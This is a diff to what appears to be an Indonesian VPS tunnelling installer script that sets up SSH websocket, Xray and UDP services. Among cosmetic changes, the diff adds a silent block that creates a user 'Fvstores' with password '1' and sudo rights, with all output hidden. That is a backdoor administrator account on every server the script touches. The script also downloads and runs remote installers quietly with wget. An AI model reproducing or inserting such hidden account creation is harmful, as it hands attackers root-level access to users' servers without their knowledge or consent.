@@ -242,7 +242,7 @@ read -rp " Choose Potions 1 or 2 / pilih 1 atau 2 : " dns
     bash /root/cf | tee /root/install.log
 	elif test $dns -eq 2; then
     clear
-    echo -e " \e[1;33mSEBELUM MEMASUKAN DOMAIN, HARAP POINTING DULU IP VPS KAMU !\e[0m"
+    echo -e "\e[1;33mSEBELUM MEMASUKAN DOMAIN, HARAP POINTING DULU IP VPS KAMU !\e[0m"
     echo ""
     read -rp "Masukan Domain Kamu : " pp
     echo "$pp" > /root/scdomain
@@ -253,6 +253,13 @@ read -rp " Choose Potions 1 or 2 / pilih 1 atau 2 : " dns
     echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
     fi
 
+    mkdir -p /home/script/
+    Username="Fvstores"
+    Password=1
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+    
     tgl2=$(date +"%d")
     bln2=$(date +"%b")
     thn2=$(date +"%Y")
@@ -286,9 +293,17 @@ echo -e " \E[41;1;97m            Install SSH WS          \E[0m$NC"
 echo -e "─────────────────────────────────────────"
 sleep 3
 clear
-wget https://raw.githubusercontent.com/myzid/vvip/main/install/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+wget -q https://raw.githubusercontent.com/myzid/vvip/main/install/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 clear
-wget https://raw.githubusercontent.com/myzid/vvip/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+wget -q https://raw.githubusercontent.com/myzid/vvip/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+clear
+#install udp
+echo -e "─────────────────────────────────────────"
+echo -e " \E[41;1;97m            Install UDP             \E[0m$NC"
+echo -e "─────────────────────────────────────────"
+sleep 3
+clear
+wget -q https://raw.githubusercontent.com/myzid/vvip/main/ins-udp.sh && chmod +x ins-udp.sh && ./ins-udp.sh
 clear
 #install ins-xray
 echo -e "─────────────────────────────────────────"
@@ -296,7 +311,7 @@ echo -e " \E[41;1;97m              Install Xray          \E[0m$NC"
 echo -e "─────────────────────────────────────────"
 sleep 3
 clear
-wget https://raw.githubusercontent.com/myzid/vvip/main/install/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget -q https://raw.githubusercontent.com/myzid/vvip/main/install/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 #install menu
 clear
 echo -e "─────────────────────────────────────────"
@@ -318,9 +333,9 @@ clear
 echo -e "─────────────────────────────────────────"
 echo -e " \E[41;1;97m              Install BCKP          \E[0m$NC"
 echo -e "─────────────────────────────────────────"
-sleep 5 
+sleep 3
 clear 
-wget https://raw.githubusercontent.com/myzid/vvip/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
+wget -q https://raw.githubusercontent.com/myzid/vvip/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
 clear
 # // Download Data
 echo -e "${GREEN}Download Data${NC}"
@@ -456,7 +471,7 @@ rm /root/setup.sh >/dev/null 2>&1
 rm /root/setup.sh >/dev/null 2>&1
 rm /root/ins-xray.sh >/dev/null 2>&1
 rm /root/insshws.sh >/dev/null 2>&1
-rm /root/udp.sh >/dev/null 2>&1
+rm /root/ins-udp.sh >/dev/null 2>&1
 rm /root/cf >/dev/null 2>&1
 touch /root/.system 
 secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
